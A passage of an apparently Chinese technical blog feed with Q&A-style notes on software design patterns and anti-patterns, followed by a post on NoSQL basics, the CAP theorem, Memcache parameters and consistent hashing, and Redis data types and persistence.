  &lt;p&gt;在设计模式中，适配器模式（英语：adapter pattern）有时候也称包装样式或者包装。将一个类的接口转接成用户所期待的。一个适配使得因接口不兼容而不能在一起工作的类工作在一起，做法是将类别自己的接口包裹在一个已存在的类中。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;php怎样实现适配器模式&quot;&gt;PHP怎样实现适配器模式？&lt;/h2&gt;

&lt;h2 id=&quot;php怎样实现迭代器模式&quot;&gt;PHP怎样实现迭代器模式？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;迭代器模式是一种设计模式，是一种最简单也最常见的设计模式。它可以让使用者透过特定的接口巡访容器中的每一个元素而不用了解底层的实作。此面，也可以实作特定目的版本的迭代器。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;观察者模式适用于什么场景&quot;&gt;观察者模式适用于什么场景？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;观察者模式（有时又被称为发布-订阅Subscribe&amp;gt;模式、模型-视图View&amp;gt;模式、源-收听者Listener&amp;gt;模式或从属者模式）是软件设计模式的一种。在此种模式中，一个目标物件管理所有相依于它的观察者物件，并且在它本身的状态改变时主动发出通知。这通常透过呼叫各观察者所提供的方法来实现。此种模式通常被用来实现事件处理系统。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
  &lt;li&gt;当一个抽象模型有两个方面，其中一个方面依赖于另一个方面。&lt;/li&gt;
  &lt;li&gt;当对一个对象的改变需要同时改变其它对象，而不知道具体有多少个对象待改变。&lt;/li&gt;
  &lt;li&gt;当一个对象必须通知其它对象，而它又不能假定其它对象是谁。换句话说，你不希望这些对象是紧密耦合的。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;怎样快速方便地实现观察者模式&quot;&gt;怎样快速方便地实现观察者模式？&lt;/h2&gt;

&lt;h2 id=&quot;观察者模式有什么点&quot;&gt;观察者模式有什么点？&lt;/h2&gt;

&lt;p&gt;观察者模式的优点：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;观察者和主题之间的耦合度较小；&lt;/li&gt;
  &lt;li&gt;支持广播通信；&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;观察者模式的缺点：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;由于观察者并不知道其它观察者的存在，它可能对改变目标的最终代价一无所知。这可能会引起意外的更新。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;什么是中介者模式&quot;&gt;什么是中介者模式？&lt;/h2&gt;

&lt;p&gt;中介者模式（Mediator Pattern）是用来降低多个对象和类之间的通信复杂性。这种模式提供了一个中介类，该类通常处理不同类之间的通信，并支持松耦合，使代码易于维护。中介者模式属于行为型模式。&lt;/p&gt;

&lt;h2 id=&quot;访问者模式有什么优点&quot;&gt;访问者模式有什么优点？&lt;/h2&gt;

&lt;p&gt;在访问者模式（Visitor Pattern）中，我们使用了一个访问者类，它改变了元素类的执行算法。通过这种方式，元素的执行算法可以随着访问者改变而改变。这种类型的设计模式属于行为型模式。根据模式，元素对象已接受访问者对象，这样访问者对象就可以处理元素对象上的操作。&lt;/p&gt;

&lt;p&gt;优点： 1、符合单一职责原则。 2、优秀的扩展性。 3、灵活性。&lt;/p&gt;

&lt;p&gt;缺点： 1、具体元素对访问者公布细节，违反了迪米特原则。 2、具体元素变更比较困难。 3、违反了依赖倒置原则，依赖了具体类，没有依赖抽象。&lt;/p&gt;

&lt;p&gt;使用场景： 1、对象结构中对象对应的类很少改变，但经常需要在此对象结构上定义新的操作。 2、需要对一个对象结构中的对象进行很多不同的并且不相关的操作，而需要避免让这些操作”污染”这些对象的类，也不希望在增加新操作时修改这些类。&lt;/p&gt;

&lt;h2 id=&quot;什么是策略模式策略模式的典型使用场景有哪些&quot;&gt;什么是策略模式？策略模式的典型使用场景有哪些？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;在策略模式（Strategy Pattern）中，一个类的行为或其算法可以在运行时更改。这种类型的设计模式属于行为型模式。在策略模式中，我们创建表示各种策略的对象和一个行为随着策略对象改变而改变的 context 对象。策略对象改变 context 对象的执行算法。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;什么是命令模式&quot;&gt;什么是命令模式？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令模式（Command Pattern）是一种数据驱动的设计模式，它属于行为型模式。请求以命令的形式包裹在对象中，并传给调用对象。调用对象寻找可以处理该命令的合适的对象，并把该命令传给相应的对象，该对象执行命令。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;有哪些地方使用了命令模式&quot;&gt;有哪些地方使用了命令模式？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;认为是命令的地方都可以使用命令模式，比如： 1、GUI 中每一个按钮都是一条命令。 2、模拟 CMD。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;什么是责任链模式责任链模式有哪些具体的应用&quot;&gt;什么是责任链模式？责任链模式有哪些具体的应用？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;责任链模式（Chain of Responsibility Pattern）为请求创建了一个接收者对象的链。这种模式给予请求的类型，对请求的发送者和接收者进行解耦。这种类型的设计模式属于行为型模式。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;JS 中的事件冒泡。&lt;/p&gt;

&lt;h2 id=&quot;链式调用模式的使用场景有哪些&quot;&gt;链式调用模式的使用场景有哪些？&lt;/h2&gt;

&lt;p&gt;使用场景： 1、有多个对象可以处理同一个请求，具体哪个对象处理该请求由运行时刻自动确定。 2、在不明确指定接收者的情况下，向多个对象中的一个提交一个请求。 3、可动态指定一组对象处理请求。&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;怎样使用设计模式&quot;&gt;怎样使用设计模式？&lt;/h1&gt;

&lt;h2 id=&quot;什么情况下应该使用设计模式&quot;&gt;什么情况下应该使用设计模式？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;敏捷开发人员不会对一个庞大的预先设计应用那些原则和模式。相反，这些原则和模式被应用在一次次的迭代中，力图使代码以及代码所表达的设计保持干净。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;使用设计模式有什么好处&quot;&gt;使用设计模式有什么好处？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;僵化性（Rigidity）：设计难以改变。&lt;/li&gt;
  &lt;li&gt;脆弱性（Fragility）：设计易于遭到破坏。&lt;/li&gt;
  &lt;li&gt;牢固性（Immobility）：设计难以重用。&lt;/li&gt;
  &lt;li&gt;粘滞性（Viscosity）：难以做正确的事情。&lt;/li&gt;
  &lt;li&gt;不必要的复杂性（Needless Complexity）：过分设计。&lt;/li&gt;
  &lt;li&gt;不必要的重复（Needless Repetition）：过多的重复。&lt;/li&gt;
  &lt;li&gt;晦涩性（Opacity）：混乱的表达。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;是否应该尽可能多的使用设计模式&quot;&gt;是否应该尽可能多的使用设计模式？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;避免过度使用设计模式　易维护的程序首先要易理解，这一点远甚于其他。在易理解的代码上才好维护。过分地使用设计模式会增加程序的复杂性和晦涩性，让程序不易理解，从而降低了程序的易维护性。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;你还使用或发现哪些设计模式&quot;&gt;你还使用或发现哪些设计模式？&lt;/h2&gt;

&lt;h2 id=&quot;什么是反模式你见过哪些反模式&quot;&gt;什么是反模式？你见过哪些反模式？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;反模式（英文：Anti-patterns或pitfalls）, 是指用来解决问题的带有共同性的不良方法。它们已经经过研究并分类，以防止日后重蹈覆辙，并能在研发尚未投产的系统时辨认出来。软件开发中公认的反模式&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;贫血的域模型（Anemic Domain Model）：仅因为每个对象都要有属性和方法，而在使用域模型的时候没有加入非OOP的业务逻辑&lt;/li&gt;
  &lt;li&gt;（BaseBean）：继承一个工具类的功能，而不是委托给它&lt;/li&gt;
  &lt;li&gt;调用父类（Call super）：需要子类调用父类被重定义的方法&lt;/li&gt;
  &lt;li&gt;圆还是椭圆问题（Circle-ellipse problem）：基于变量的子类化关系进行子类化&lt;/li&gt;
  &lt;li&gt;循环依赖（Circular dependency）：在对象或软件模块中，直接或间接引入循环依赖。&lt;/li&gt;
  &lt;li&gt;常量接口（Constant interface）：使用接口定义常量&lt;/li&gt;
  &lt;li&gt;上帝对象（God object）：在设计的单一部分（某个类）集中了过多的功能&lt;/li&gt;
  &lt;li&gt;对象粪池（Object cesspool）：复用那些不满足复用条件的对象。对象池是一种管理对象的方法，在重复使用对象前，需要针对对象进行初始化，以避免上次使用后的状态等数据影响下次的使用&lt;/li&gt;
  &lt;li&gt;不羁的对象（Object orgy）：没有成功封装对象，外部可以不受限制地访问它的内部&lt;/li&gt;
  &lt;li&gt;幽灵（Poltergeists）：指这样一些对象，它们唯一的作用就是把信息传给其它对象&lt;/li&gt;
  &lt;li&gt;顺序耦合（Sequential coupling）：指这样一些对象，它们的方法必须要按某种特定顺序调用&lt;/li&gt;
  &lt;li&gt;悠悠问题（Yo-yo problem）：一个结构（例如继承）因为过度碎片化而变得难于理解&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;参考&quot;&gt;参考&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;http://www.uml.org.cn/sjms/201211023.asp&quot;&gt;设计模式六大原则&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.cnblogs.com/nuaalfm/archive/2010/04/23/1718453.html&quot;&gt;面向对象思想的头脑风暴（二）—— 详解继承与组合的优缺点&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://ptc.35.com/?p=512&quot;&gt;组合未必优于继承&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.chinasa.info/article/designpattern002.html&quot;&gt;设计模式真的有使用的必要吗？&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://coolshell.cn/articles/4535.html&quot;&gt;一些软件设计的原则&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E5%8F%8D%E9%9D%A2%E6%A8%A1%E5%BC%8F#.E9.9D.A2.E5.90.91.E5.AF.B9.E8.B1.A1.E8.AE.BE.E8.AE.A1&quot;&gt;反面模式&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.w3cschool.cc/design-pattern/design-pattern-tutorial.html&quot;&gt;设计模式&lt;/a&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>NoSQL三剑客</title>
   <link href="http://yanpeipan.github.io/2015/01/09/nosql%E4%B8%89%E5%89%91%E5%AE%A2.html"/>
   <updated>2015-01-09T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2015/01/09/nosql三剑客</id>
   <content type="html">
&lt;hr /&gt;

&lt;h1 id=&quot;nosql基础&quot;&gt;NoSQL基础&lt;/h1&gt;

&lt;h2 id=&quot;什么是nosql&quot;&gt;什么是NoSQL？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;NoSQL有时也称作Not Only SQL的缩写，是对不同于传统的关联式数据库的数据库管理系统的统称。（注依据Martin Fowler，NoSQL 不是英文Not Only SQL, 因为这会是NOSQL 而不是NoSQL)
两者存在许多显著的不同点，其中最重要的是NoSQL不使用SQL作为查询语言。其数据存储可以不需要固定的表格模式，也经常会避免使用SQL的JOIN操作，一般有水平可扩展性的特征。NoSQL的实现具有二个特征：使用硬盘，或者把随机存储器作存储载体。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;关系型数据库的优势和不足&quot;&gt;关系型数据库的优势和不足？&lt;/h2&gt;

&lt;p&gt;关系型数据库的优点：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;传统的关系数据库具有不错的性能，高稳定型，久经历史考验，而且使用简单，功能强大，同时也积累了大量的成功案例。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;容易理解：二维表结构是非常贴近逻辑世界的一个概念，关系模型相对网状、层次等其他模型来说更容易理解&lt;/li&gt;
  &lt;li&gt;使用方便：通用的SQL语言使得操作关系型数据库非常方便&lt;/li&gt;
  &lt;li&gt;易于维护：丰富的完整性(实体完整性、参照完整性和用户定义的完整性)大大减低了数据冗余和数据不一致的概率&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;传统SQL数据库为了实现ACID(atomicity, consistency, isolation, durability)，往往需要频繁应用文件锁，这使得其在现代的web2.0应用中越来越捉襟见肘。现在SNS网站每一个点击都是一条/多条查询，对数据库写的并发要求非常之高，而传统数据库无法很好地应对这种需求。而仔细想来SNS中大部分需求并不要求ACID，比如Like/Unlike投票等等。&lt;/p&gt;

&lt;h2 id=&quot;为什么要使用nosql数据库&quot;&gt;为什么要使用NoSQL数据库？&lt;/h2&gt;

&lt;p&gt;在互联网，大部分的MySQL都应该是IO密集型的，事实上，如果你的MySQL是个CPU密集型的话，那么很可能你的MySQL设计得有性能问题，需要优化了。大数据量高并发环境下的MySQL应用开发越来越复杂，也越来越具有技术挑战性。分表分库的规则把握都是需要经验的。虽然有像淘宝这样技术实力强大的公司开发了透明的中间件层来屏蔽开发者的复杂性，但是避免不了整个架构的复杂性。分库分表的子库到一定阶段又面临扩展问题。还有就是需求的变更，可能又需要一种新的分库方式。&lt;/p&gt;

&lt;p&gt;MySQL数据库也经常存储一些大文本字段，导致数据库表非常的大，在做数据库恢复的时候就导致非常的慢，不容易快速恢复数据库。比如1000万4KB大小的文本就接近40GB的大小，如果能把这些数据从MySQL省去，MySQL将变得非常的小。&lt;/p&gt;

&lt;p&gt;关系数据库很强大，但是它并不能很好的应付所有的应用场景。MySQL的扩展性差（需要复杂的技术来实现），大数据下IO压力大，表结构更改困难，正是当前使用MySQL的开发人员面临的问题。&lt;/p&gt;

&lt;h2 id=&quot;nosql的优势和不足&quot;&gt;NoSQL的优势和不足？&lt;/h2&gt;

&lt;p&gt;易扩展&lt;/p&gt;

&lt;p&gt;NoSQL数据库种类繁多，但是一个共同的特点都是去掉关系数据库的关系型特性。数据之间无关系，这样就非常容易扩展。也无形之间，在架构的层面上带来了可扩展的能力。&lt;/p&gt;

&lt;p&gt;大数据量，高性能&lt;/p&gt;

&lt;p&gt;NoSQL数据库都具有非常高的读写性能，尤其在大数据量下，同样表现优秀。这得益于它的无关系性，数据库的结构简单。一般MySQL使用Query Cache，每次表的更新Cache就失效，是一种大粒度的Cache，在针对web2.0的交互频繁的应用，Cache性能不高。而NoSQL的Cache是记录级的，是一种细粒度的Cache，所以NoSQL在这个层面上来说就要性能高很多了。&lt;/p&gt;

&lt;p&gt;灵活的数据模型&lt;/p&gt;

&lt;p&gt;NoSQL无需事先为要存储的数据建立字段，随时可以存储自定义的数据格式。而在关系数据库里，增删字段是一件非常麻烦的事情。如果是非常大数据量的表，增加字段简直就是一个噩梦。这点在大数据量的web2.0时代尤其明显。&lt;/p&gt;

&lt;p&gt;高可用&lt;/p&gt;

&lt;p&gt;NoSQL在不太影响性能的情况，就可以方便的实现高可用的架构。比如Cassandra，HBase模型，通过复制模型也能实现高可用。&lt;/p&gt;

&lt;h2 id=&quot;什么是io的五分钟法则&quot;&gt;什么是I/O的五分钟法则？&lt;/h2&gt;

&lt;p&gt;如果一条记录频繁被访问，就应该放到内存里，否则的话就应该待在硬盘上按需要再访问。这个临界点就是五分钟。看上去像一条经验性的法则，实际上五分钟的评估标准是根据投入成本判断的，根据当时的硬件发展水准，在内存中保持 1KB 的数据成本相当于硬盘中存储同样大小数据 400 秒的开销(接近五分钟)。&lt;/p&gt;

&lt;h2 id=&quot;什么是分布式数据系统的cap定理&quot;&gt;什么是分布式数据系统的CAP定理？&lt;/h2&gt;

&lt;p&gt;在理论计算机科学中，CAP定理（CAP theorem），又被称作布鲁尔定理（Brewer’s theorem），它指出对于一个分布式计算系统来说，不可能同时满足以下三点：[1][2]&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;一致性（Consistency)（等同于所有节点访问同一份最新的数据副本）&lt;/li&gt;
  &lt;li&gt;可用性（Availability）（对数据更新具备高可用性）&lt;/li&gt;
  &lt;li&gt;容忍网络分区（Partition tolerance）（以实际效果而言，分区相当于对通信的时限要求。系统如果不能在时限内达成数据一致性，就意味着发生了分区的情况，必须就当前操作在C和A之间做出选择[3]。）&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;memchache相关&quot;&gt;Memchache相关&lt;/h1&gt;

&lt;h2 id=&quot;什么是memcache&quot;&gt;什么是Memcache&lt;/h2&gt;

&lt;p&gt;memcached是一套分布式的高速缓存系统，由LiveJournal的Brad Fitzpatrick开发，但目前被许多网站使用。这是一套开放源代码软件，以BSD license授权发布。&lt;/p&gt;

&lt;h2 id=&quot;memcache有哪些特点&quot;&gt;Memcache有哪些特点？&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Free &amp;amp; open source, high-performance, distributed memory object caching system&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;协议简单&lt;/li&gt;
  &lt;li&gt;基于libevent的事件处理&lt;/li&gt;
  &lt;li&gt;内置内存存储方式&lt;/li&gt;
  &lt;li&gt;memcached不互相通信的分布式&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;memcache有哪些启动参数&quot;&gt;Memcache有哪些启动参数？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;-p 指定端口号（默认11211）&lt;/li&gt;
  &lt;li&gt;-U &lt;num&gt; UDP监听端口 (默认: 11211, 0 时关闭)&lt;/num&gt;&lt;/li&gt;
  &lt;li&gt;-s &lt;file&gt;     用于监听的UNIX套接字路径（禁用网络支持）&lt;/file&gt;&lt;/li&gt;
  &lt;li&gt;-a &lt;mask&gt;     UNIX套接字访问掩码，八进制数字（默认：0700）&lt;/mask&gt;&lt;/li&gt;
  &lt;li&gt;-m 指定最大使用内存大小（默认64MB）&lt;/li&gt;
  &lt;li&gt;-t 线程数（默认4）&lt;/li&gt;
  &lt;li&gt;&lt;/li&gt;
  &lt;li&gt;-l &lt;ip_addr&gt; 绑定地址 (默认:所有都允许,无论内外网或者本机更换IP，有安全隐患，若设置为127.0.0.1就只能本机访问)&lt;/ip_addr&gt;&lt;/li&gt;
  &lt;li&gt;-d start 启动memcached服务&lt;/li&gt;
  &lt;li&gt;-d restart 重起memcached服务&lt;/li&gt;
  &lt;li&gt;
    &lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;-d stop&lt;/td&gt;
          &lt;td&gt;shutdown 关闭正在运行的memcached服务&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
  &lt;li&gt;-u &lt;username&gt; 绑定使用指定用于运行进程 &lt;username&gt;  （只有root用户可以使用这个参数）&lt;/username&gt;&lt;/username&gt;&lt;/li&gt;
  &lt;li&gt;-P &lt;file&gt; 将PID写入文件&lt;file&gt;，这样可以使得后边进行快速进程终止, 需要与 -d 一起使用&lt;/file&gt;&lt;/file&gt;&lt;/li&gt;
  &lt;li&gt;-m 最大内存使用，单位MB。默认64MB     www.2cto.com&lt;/li&gt;
  &lt;li&gt;&lt;/li&gt;
  &lt;li&gt;-M 内存耗尽时返回错误，而不是删除项&lt;/li&gt;
  &lt;li&gt;-c 最大同时连接数，默认是1024&lt;/li&gt;
  &lt;li&gt;-f 块大小增长因子，默认是1.25&lt;/li&gt;
  &lt;li&gt;-n &lt;bytes&gt;最小分配空间，key+value+flags默认是48&lt;/bytes&gt;&lt;/li&gt;
  &lt;li&gt;-k锁定所有内存页。注意你可以锁定的内存上限。试图分配更多内存会失败的，所以留意启动守护进程时所用的用户可分配的内存上限。（不是前面的 -u &lt;username&gt; 参数；在sh下，使用命令&quot;ulimit -S -l NUM_KB&quot;来设置。）&lt;/username&gt;&lt;/li&gt;
  &lt;li&gt;-v 提示信息（在事件循环中打印错误/警告信息。）&lt;/li&gt;
  &lt;li&gt;-vv 详细信息（还打印客户端命令/响应）&lt;/li&gt;
  &lt;li&gt;-vvv 超详细信息（还打印内部状态的变化）&lt;/li&gt;
  &lt;li&gt;-h 打印这个帮助信息并退出。&lt;/li&gt;
  &lt;li&gt;-i  打印memcached和libevent的许可。&lt;/li&gt;
  &lt;li&gt;-L 尝试使用大内存页（如果可用的话）。提高内存页尺寸可以减少”页表缓冲（TLB）”丢失次数，提高运行效率。为了从操作系统获得大内存页，memcached会把全部数据项分配到一个大区块。&lt;/li&gt;
  &lt;li&gt;-D &lt;char&gt;     使用 &lt;char&gt; 作为前缀和ID的分隔符。这个用于按前缀获得状态报告。默认是&quot;:&quot;（冒号）。如果指定了这个参数，则状态收集会自动开启；如果没指定，则需要用命令&quot;stats detail on&quot;来开启。&lt;/char&gt;&lt;/char&gt;&lt;/li&gt;
  &lt;li&gt;-t &lt;num&gt;      使用的线程数（默认：4）&lt;/num&gt;&lt;/li&gt;
  &lt;li&gt;-R 每个连接可处理的最大请求数。&lt;/li&gt;
  &lt;li&gt;-C 禁用CAS。&lt;/li&gt;
  &lt;li&gt;-b 设置后台日志队列的长度（默认：1024）&lt;/li&gt;
  &lt;li&gt;-B 绑定协议 - 可能值：ascii,binary,auto（默认）&lt;/li&gt;
  &lt;li&gt;-I 重写每个数据页尺寸。调整数据项最大尺寸。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;memcache如何存储session&quot;&gt;Memcache如何存储session？&lt;/h2&gt;

&lt;p&gt;memcached提供了一个自定义的session处理器可以被用于存储用户session数据到memcached服务端。 一个完全独立的memcached实例将会在内部使用，因此如果需要您可以设置一个不同的服务器池。session的 key被存储在前缀memc.sess.key.之下，因此, 如果你对session和通常的缓存使用了 同样的服务器池，请注意这一点。 译注：另外一个session和通常缓存分离的原因是当通常的缓存占满了memcached服务端后，可能会导致你的session被 从缓存中踢除，导致用户莫名的掉线。&lt;/p&gt;

&lt;p&gt;session.save_handler string&lt;br /&gt;
设置为memcached开启memcached的session处理器。&lt;/p&gt;

&lt;p&gt;session.save_path string&lt;br /&gt;
定义一个逗号分隔的hostname:port样式的session缓存服务器池，例如： “sess1:11211, sess2:11211”.&lt;/p&gt;

&lt;h2 id=&quot;什么是一致性哈希算法&quot;&gt;什么是一致性哈希算法？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;一致性哈希算法在1997年由麻省理工学院提出的一种分布式哈希（DHT）实现算法，设计目标是为了解决因特网中的热点(Hot spot)问题，初衷和CARP十分类似。一致性哈希修正了CARP使用的简 单哈希算法带来的问题，使得分布式哈希（DHT）可以在P2P环境中真正得到应用。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;一致性hash算法提出了在动态变化的Cache环境中，判定哈希算法好坏的四个定义：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;平衡性(Balance)：平衡性是指哈希的结果能够尽可能分布到所有的缓冲中去，这样可以使得所有的缓冲空间都得到利用。很多哈希算法都能够满足这一条件。&lt;/li&gt;
  &lt;li&gt;单调性(Monotonicity)：单调性是指如果已经有一些内容通过哈希分派到了相应的缓冲中，又有新的缓冲加入到系统中。哈希的结果应能够保证原有已分配的内容可以被映射到原有的或者新的缓冲中去，而不会被映射到旧的缓冲集合中的其他缓冲区。&lt;/li&gt;
  &lt;li&gt;分散性(Spread)：在分布式环境中，终端有可能看不到所有的缓冲，而是只能看到其中的一部分。当终端希望通过哈希过程将内容映射到缓冲上时，由于不同终端所见的缓冲范围有可能不同，从而导致哈希的结果不一致，最终的结果是相同的内容被不同的终端映射到不同的缓冲区中。这种情况显然是应该避免的，因为它导致相同内容被存储到不同缓冲中去，降低了系统存储的效率。分散性的定义就是上述情况发生的严重程度。好的哈希算法应能够尽量避免不一致的情况发生，也就是尽量降低分散性。&lt;/li&gt;
  &lt;li&gt;负载(Load)：负载问题实际上是从另一个角度看待分散性问题。既然不同的终端可能将相同的内容映射到不同的缓冲区中，那么对于一个特定的缓冲区而言，也可能被不同的用户映射为不同 的内容。与分散性一样，这种情况也是应当避免的，因此好的哈希算法应能够尽量降低缓冲的负荷。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;一致哈希将每个对象映射到圆环边上的一个点，系统再将可用的节点机器映射到圆环的不同位置。查找某个对象对应的机器时，需要用一致哈希算法计算得到对象对应圆环边上位置，沿着圆环边上查找直到遇到某个节点机器，这台机器即为对象应该保存的位置。 当删除一台节点机器时，这台机器上保存的所有对象都要移动到下一台机器。添加一台机器到圆环边上某个点时，这个点的下一台机器需要将这个节点前对应的对象移动到新机器上。 更改对象在节点机器上的分布可以通过调整节点机器的位置来实现。&lt;/p&gt;

&lt;h2 id=&quot;如何提高memcache缓存命中率&quot;&gt;如何提高Memcache缓存命中率？&lt;/h2&gt;

&lt;p&gt;应用缓存的命中率取决于很多的因素：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;应用场景&lt;br /&gt;
是OLTP还是OLAP应用，即使是OLTP，也要看访问的频度，一个极少被访问到的缓存等于没有什么效果。一般来说，互联网网站是非常适合缓存应用的场景。&lt;/li&gt;
  &lt;li&gt;缓存的粒度&lt;br /&gt;
毫无疑问，缓存的粒度越小，命中率就越高，对象缓存是目前缓存粒度最小的，因此被命中的几率更高。举个例子来说吧：你访问当前这个页面，浏览帖子，那么对于ORM来说，需要发送n条SQL，取各自帖子user的对象。很显然，如果这个user在其他帖子里面也跟贴了，那么在访问那个帖子的时候，就可以直接从缓存里面取这个user对象了。&lt;/li&gt;
  &lt;li&gt;架构的设计&lt;br /&gt;
架构的设计对于缓存命中率也有至关重要的影响。例如你应该如何去尽量避免缓存失效的问题，如何尽量提供频繁访问数据的缓存问题，这些都是考验架构师水平的地方。再举个例子来说，对于论坛，需要记录每个topic的浏览次数，所以每次有人访问这个topic，那么topic表就要update一次，这意味着什么呢？对于topic的对象缓存是无效的，每次访问都要更新缓存。那么可以想一些办法，例如增加一个中间变量记录点击次数，每累计一定的点击，才更新一次数据库，从而减低缓存失效的频率。&lt;/li&gt;
  &lt;li&gt;缓存的容量和缓存的有效期&lt;br /&gt;
缓存太小，造成频繁的LRU，也会降低命中率，缓存的有效期太短也会造成缓存命中率下降。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;LRU是Least Recently Used 近期最少使用算法。
内存管理的一种页面置换算法，对于在内存中但又不用的数据块（内存块）叫做LRU，Oracle会根据哪些数据属于LRU而将其移出内存而腾出空间来加载另外的数据。&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;redis相关&quot;&gt;Redis相关&lt;/h1&gt;

&lt;h2 id=&quot;什么是redis&quot;&gt;什么是Redis？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;Redis是一个开源、支持网络、基于内存、键值对存储数据库，使用ANSI C编写。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;redis有哪些特点&quot;&gt;Redis有哪些特点？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;性能极高 – Redis能支持超过 100K+ 每秒的读写频率。&lt;/li&gt;
  &lt;li&gt;丰富的数据类型 – Redis支持二进制案例的 Strings, Lists, Hashes, Sets 及 Ordered Sets 数据类型操作。&lt;/li&gt;
  &lt;li&gt;原子 – Redis的所有操作都是原子性的，同时Redis还支持对几个操作全并后的原子性执行。&lt;/li&gt;
  &lt;li&gt;丰富的特性 – Redis还支持 publish/subscribe, 通知, key 过期等等特性。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;redis有哪些数据类型&quot;&gt;Redis有哪些数据类型？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;二进制安全的 字符串 string&lt;/li&gt;
  &lt;li&gt;二进制安全的 字符串列表 list of string&lt;/li&gt;
  &lt;li&gt;二进制安全的 字符串集合 set of string，换言之：它是一组无重复未排序的element。可以把它看成Ruby中的 hash–其key等于element，value都等于’true‘。&lt;/li&gt;
  &lt;li&gt;有序集合sorted set of string，类似于集合set，但其中每个元素都和一个浮点数score（评分）关联。element根据score排序。可以把它看成Ruby中的 hash–其key等于element，value等于score，但元素总是按score的顺序排列，无需额外的排序操作。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;redis如何存储session&quot;&gt;Redis如何存储session？&lt;/h2&gt;

&lt;h2 id=&quot;redis的持久化规则是&quot;&gt;Redis的持久化规则是？&lt;/h2&gt;

&lt;p&gt;Redis的所有数据都是保存在内存中，然后不定期的通过异步方式保存到磁盘上(这称为“半持久化模式”)；也可以把每一次数据变化都写入到一个append only file(aof)里面(这称为“全持久化模式”)。&lt;/p&gt;

&lt;p&gt;Redis支持2种持久化策略：snapshot方式和commandlog方式，前者通过将当前内存数据快照周期性写入RDB文件来实现；后者通过在log中记录Redis进程收到的写操作来实现，下次Redis重启时，回放commandlog来恢复数据状态。&lt;/p&gt;

&lt;p&gt;根据实际需求，用户可以选择完全禁用持久化，也可以在同一个Redis实例中同时启用RDB和AOF。特别注意：如果部署方式为主从，则不同实例的持久化时机最好错开！避免master和slaves同时进入后台持久化，这可能会降低系统的性能。&lt;/p&gt;

&lt;h2 id=&quot;如何用reids实现一个优先级队列&quot;&gt;如何用Reids实现一个优先级队列？&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;sorted set&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;如何配置reids主从复制&quot;&gt;如何配置Reids主从复制？&lt;/h2&gt;

